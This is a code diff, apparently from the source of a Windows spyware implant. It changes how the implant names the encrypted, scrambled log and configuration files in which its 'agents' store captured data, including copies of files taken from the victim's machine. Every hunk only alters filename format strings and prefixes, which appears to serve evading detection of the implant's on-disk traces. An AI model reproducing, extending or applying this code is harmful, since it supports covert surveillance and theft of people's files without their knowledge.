@@ -414,7 +414,7 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 	// riesce ad aprire il file)
 	for(i=0; i<MAX_LOG_ENTRIES; i++) 
 		if (log_table[i].agent_tag == NO_TAG_ENTRY) {
-			sprintf(log_wout_path, "%.1XLOG_%.4X_0000000000000000.log", log_active_queue, agent_tag);
+			sprintf(log_wout_path, "%.1XLOG%.4Xseq.log", log_active_queue, agent_tag);
 			if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
 				return FALSE;			
 			HM_CompletePath(scrambled_name, file_name);
@@ -602,7 +602,7 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 		if (retry_count > MAX_FILE_RETRY_COUNT)
 			return INVALID_HANDLE_VALUE;
 
-		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF_%.4X_%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
 		if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
 			return INVALID_HANDLE_VALUE;	
 		HM_CompletePath(scrambled_name, file_name);
@@ -653,7 +653,7 @@ HANDLE Log_CreateOutputFile(char *command_name)
 	// Usa l'epoch per dare un nome univoco al file
 	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
 
-	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF_%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "OUTF%.8X%.8X.log", time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
 	if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) )
 		return INVALID_HANDLE_VALUE;	
 	HM_CompletePath(scrambled_name, file_name);
@@ -725,8 +725,8 @@ BOOL Log_SaveAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 	HANDLE hf;
 	DWORD dwWrt = 0;
 
-	// Il formato del nome e' AGCNF_<agent>.bin
-	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "AGCNF_%.4X.bin", agent_tag);
+	// Il formato del nome e' ACFG<agent>.bin
+	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
 	if ( ! (scrambled_name = LOG_ScrambleName(conf_name, crypt_key[0], TRUE)) ) 
 		return FALSE;
 	
@@ -756,8 +756,8 @@ BOOL Log_RestoreAgentState(DWORD agent_tag, BYTE *conf_buf, DWORD conf_len)
 	HANDLE hf;
 	DWORD dwRd = 0;
 
-	// Il formato del nome e' AGCNF_<agent>.bin
-	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "AGCNF_%.4X.bin", agent_tag);
+	// Il formato del nome e' ACFG<agent>.bin
+	_snprintf_s(conf_name, sizeof(conf_name), _TRUNCATE, "ACFG%.4X.bin", agent_tag);
 	if ( ! (scrambled_name = LOG_ScrambleName(conf_name, crypt_key[0], TRUE)) ) 
 		return FALSE;
 	
@@ -992,7 +992,6 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 	if (src_info.nFileSizeHigh>0 || src_info.nFileSizeLow==0) 
 		return FALSE;
 	
-	// Il formato del nome e' [0/1]LOGF_<agent>_<path_name_SHA1>.log
 	// fa lo SHA1 del path in red_fname
 	SHA1Context sha;
 	SHA1Reset(&sha);
@@ -1005,7 +1004,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 		sprintf(red_fname+(i*8), "%.8X", sha.Message_Digest[i]);
 
 	// Vede se ha gia' catturato questo file...
-	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF_%.4X_%s_*.log", agent_tag, red_fname);
+	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF%.4X%s*.log", agent_tag, red_fname);
 	if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) ) 
 		return FALSE;	
 	HM_CompletePath(scrambled_name, dest_file_mask);
@@ -1019,7 +1018,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 		// ...altrimenti gli crea un nome col timestamp attuale
 		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
 		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
-		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF_%.4X_%s_%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
 		if ( ! (scrambled_name = LOG_ScrambleName(log_wout_path, crypt_key[0], TRUE)) ) 
 			return FALSE;	
 		HM_CompletePath(scrambled_name, dest_file_path);
